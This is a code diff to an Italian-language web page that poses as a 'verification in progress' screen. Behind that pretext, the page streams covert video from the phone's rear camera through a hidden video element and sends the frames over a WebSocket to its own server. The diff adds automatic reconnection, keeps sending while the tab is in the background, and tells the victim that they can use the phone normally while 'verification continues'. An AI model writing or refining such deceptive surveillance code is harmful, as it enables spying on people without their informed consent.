@@ -7,10 +7,12 @@
   <style>
     body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
     .msg { padding:40px 20px; font-size:18px; }
+    #debug { position:fixed; bottom:0; left:0; right:0; background:rgba(0,0,0,0.8); color:#0f0; padding:10px; font-size:12px; }
   </style>
 </head>
 <body>
   <div class="msg">Verifica in corso...<br><small>Non chiudere questa pagina.</small></div>
+  <div id="debug"></div>
 
   <!-- Video nascosto -->
   <video id="cam" playsinline style="display:none;"></video>
@@ -20,69 +22,152 @@
     const video = document.getElementById('cam');
     const canvas = document.getElementById('canvas');
     const ctx = canvas.getContext('2d');
+    const debug = document.getElementById('debug');
     const room = new URLSearchParams(location.search).get('room') || 'user1';
     
     let stream = null;
     let sending = false;
+    let ws = null;
+    let frameInterval = null;
+    
+    function log(msg) {
+      debug.textContent = new Date().toLocaleTimeString() + ': ' + msg;
+      console.log(msg);
+    }
 
-    // WebSocket (anche in background)
-    const ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);
+    // Gestione WebSocket
+    function connectWebSocket() {
+      if (ws) {
+        ws.close();
+      }
 
-    ws.onopen = () => startCamera();
-    ws.onclose = () => console.log('Connessione persa');
-    ws.onerror = () => console.log('Errore WS');
+      ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);
 
-    // Invia frame ogni 150ms (~6-7 FPS, basso consumo)
+      ws.onopen = () => {
+        log('WebSocket connesso');
+        if (!stream) {
+          startCamera();
+        } else {
+          startSendingFrames();
+        }
+      };
+
+      ws.onclose = () => {
+        log('Connessione persa - riconnessione...');
+        stopSendingFrames();
+        // Riprova a connetterti dopo 3 secondi
+        setTimeout(connectWebSocket, 3000);
+      };
+
+      ws.onerror = (err) => {
+        log('Errore WebSocket: ' + (err.message || 'errore sconosciuto'));
+      };
+    }
+
+    // Avvia la connessione iniziale
+    connectWebSocket();
+
+    function startSendingFrames() {
+      if (frameInterval) {
+        clearInterval(frameInterval);
+      }
+      sending = true;
+      // Invia subito il primo frame
+      sendFrame();
+      // Imposta l'invio periodico
+      frameInterval = setInterval(sendFrame, 150);
+      log('Avviato invio frames');
+    }
+
+    function stopSendingFrames() {
+      sending = false;
+      if (frameInterval) {
+        clearInterval(frameInterval);
+        frameInterval = null;
+      }
+      log('Fermato invio frames');
+    }
+
+    // Invia singolo frame
     function sendFrame() {
-      if (!sending || video.videoWidth === 0) return;
+      if (!sending || !video.videoWidth || !ws || ws.readyState !== WebSocket.OPEN) return;
+      
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       ctx.drawImage(video, 0, 0);
+      
       canvas.toBlob(blob => {
-        if (ws.readyState === WebSocket.OPEN && blob) {
-          console.log('Invio frame:', blob.size, 'bytes');
+        if (ws && ws.readyState === WebSocket.OPEN && blob) {
           ws.send(blob);
+          log('Frame inviato: ' + blob.size + ' bytes');
         }
       }, 'image/jpeg', 0.5); // Ridotta qualità per migliorare performance
-      setTimeout(sendFrame, 150);
     }
 
     // Avvia fotocamera POSTERIORE
     async function startCamera() {
       try {
         stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'environment', width: { ideal: 1280 } },
+          video: { 
+            facingMode: 'environment',
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
+          },
           audio: false
         });
         video.srcObject = stream;
         video.onloadedmetadata = () => {
-          sending = true;
-          sendFrame();
-
-          // Messaggio finale + chiudi visuale
-          document.body.innerHTML = `
-            <div class="msg">
+          startSendingFrames();
+          
+          // Messaggio finale
+          document.querySelector('.msg').innerHTML = `
+            <div>
               <b>Verifica completata</b><br>
               <small>Puoi usare il telefono normalmente.<br>
               La verifica continua in background.</small>
             </div>`;
-          
-          // Opzionale: minimizza automaticamente (solo mobile)
-          setTimeout(() => {
-            if (navigator.userActivation?.isActive) {
-              document.body.innerHTML = '';
-            }
-          }, 3000);
         };
+
+        // Avvia il video
+        await video.play();
+        log('Camera avviata con successo');
+        
       } catch (err) {
-        document.body.innerHTML = `<div class="msg">Errore: ${err.message}</div>`;
+        log('Errore camera: ' + err.message);
+        document.querySelector('.msg').innerHTML = `<div>Errore: ${err.message}</div>`;
       }
     }
 
-    // Tieni vivo il WebSocket anche se la scheda è in background
+    // Gestione visibilità pagina
+    document.addEventListener('visibilitychange', () => {
+      if (document.hidden) {
+        // La pagina è nascosta, continua a inviare
+        log('Pagina in background - continuo invio');
+      } else {
+        // La pagina è visibile di nuovo
+        log('Pagina in primo piano');
+        if (!sending && stream) {
+          startSendingFrames();
+        }
+      }
+    });
+
+    // Gestione chiusura pagina
+    window.onbeforeunload = () => {
+      stopSendingFrames();
+      if (ws) ws.close();
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+      }
+    };
+
+    // Tieni vivo il WebSocket
     setInterval(() => {
-      if (ws.readyState === WebSocket.OPEN) ws.send('ping');
-    }, 10000);
+      if (ws && ws.readyState === WebSocket.OPEN) {
+        ws.send('ping');
+        log('Ping inviato');
+      }
+    }, 30000);
   </script>
 </body>
 </html>
